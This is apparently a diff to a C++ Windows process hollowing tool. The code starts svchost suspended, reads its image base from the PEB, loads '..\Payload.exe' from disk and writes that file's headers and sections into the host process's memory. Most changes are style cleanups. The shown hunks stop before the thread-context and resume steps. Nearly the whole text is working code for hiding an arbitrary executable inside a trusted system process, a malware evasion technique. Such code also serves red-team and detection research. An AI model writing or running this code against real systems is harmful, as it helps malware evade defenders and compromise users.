@@ -24,10 +24,11 @@ typedef struct BASE_RELOCATION_ENTRY {
 
 int main(int argc, char **argv) {
     // prepare environment for obtaining process information
-    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();  // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
-    LPPROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();  // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
-    PROCESS_BASIC_INFORMATION *pprocessBasicInformation = new PROCESS_BASIC_INFORMATION();  // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
+    auto startupInfo = new STARTUPINFOA();  // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
+    auto processInformation = new PROCESS_INFORMATION();  // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information
+    auto *pprocessBasicInformation = new PROCESS_BASIC_INFORMATION();  // https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
     DWORD retLen = 0;
+
     HMODULE hNtDll = sm_LoadNTDLLFunctions();
     if (!hNtDll) {
         std::cerr << "Couldn't load ntdll" << std::endl;
@@ -37,8 +38,8 @@ int main(int argc, char **argv) {
     // run host process (process to be hollowed out)
     // the process has to be suspended
     // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
-    CreateProcessA(NULL, (LPSTR)"svchost.exe", NULL, NULL, TRUE,
-                   CREATE_SUSPENDED, NULL, NULL, startupInfo, processInformation);
+    CreateProcessA(0, (LPSTR)"svchost", 0, 0, 0,
+                   CREATE_SUSPENDED, 0, 0, startupInfo, processInformation);
 
     // now store a handle to this process
     HANDLE hostProc = processInformation->hProcess;
@@ -53,17 +54,17 @@ int main(int argc, char **argv) {
     // now we have the address of PEB,
     // the ImageBaseAddress is 8 bytes away from the PEB
     DWORD PEBImageBaseOffset = (DWORD)pprocessBasicInformation->PebBaseAddress + 8;
-    LPVOID hostImageBase = 0;
-    SIZE_T bytesRead = NULL;
+    LPVOID hostImageBase = nullptr;
+    SIZE_T bytesRead = 0;
     ReadProcessMemory(hostProc, (LPCVOID)PEBImageBaseOffset, &hostImageBase, 4, &bytesRead);  // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
 
     // prepare the payload to be placed in the hollowed process
     // this can be any entry point, regshot is done for the sake of example
-    HANDLE payload = CreateFileA("C:\\Temp\\regshot\\regshot.exe", GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
-    DWORD payloadSize = GetFileSize(payload, NULL);
+    HANDLE payload = CreateFileA("..\\Payload.exe", GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0);
+    DWORD payloadSize = GetFileSize(payload, 0);
     LPDWORD payloadBytesRead = 0;
     LPVOID payloadBytesBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, payloadSize);
-    ReadFile(payload, payloadBytesBuff, payloadSize, NULL, NULL);
+    ReadFile(payload, payloadBytesBuff, payloadSize, 0, 0);
 
     PIMAGE_DOS_HEADER payloadImageDosHeader = (PIMAGE_DOS_HEADER)payloadBytesBuff;
     PIMAGE_NT_HEADERS payloadImageNtHeaders = (PIMAGE_NT_HEADERS)((DWORD)payloadBytesBuff + payloadImageDosHeader->e_lfanew);
@@ -84,7 +85,7 @@ int main(int argc, char **argv) {
     payloadImageNtHeaders->OptionalHeader.ImageBase = (DWORD)hostImageBase;
 
     // copy the payload headers to the host image
-    WriteProcessMemory(hostProc, newHostImageBase, payloadBytesBuff, payloadImageNtHeaders->OptionalHeader.SizeOfHeaders, NULL);
+    WriteProcessMemory(hostProc, newHostImageBase, payloadBytesBuff, payloadImageNtHeaders->OptionalHeader.SizeOfHeaders, nullptr);
 
     // obtain pointer to payload image section
     PIMAGE_SECTION_HEADER payloadImageSection = (PIMAGE_SECTION_HEADER)((DWORD)payloadBytesBuff + payloadImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
@@ -97,7 +98,7 @@ int main(int argc, char **argv) {
         PVOID hostSectionloc = (PVOID)((DWORD)hostImageBase + payloadImageSection->VirtualAddress);
         PVOID payloadSectionLoc = (PVOID)((DWORD)payloadBytesBuff + payloadImageSection->PointerToRawData);
 
-        WriteProcessMemory(hostProc, hostSectionloc, payloadSectionLoc, payloadImageSection->SizeOfRawData, NULL);
+        WriteProcessMemory(hostProc, hostSectionloc, payloadSectionLoc, payloadImageSection->SizeOfRawData, nullptr);
 
         payloadImageSection++;
     }
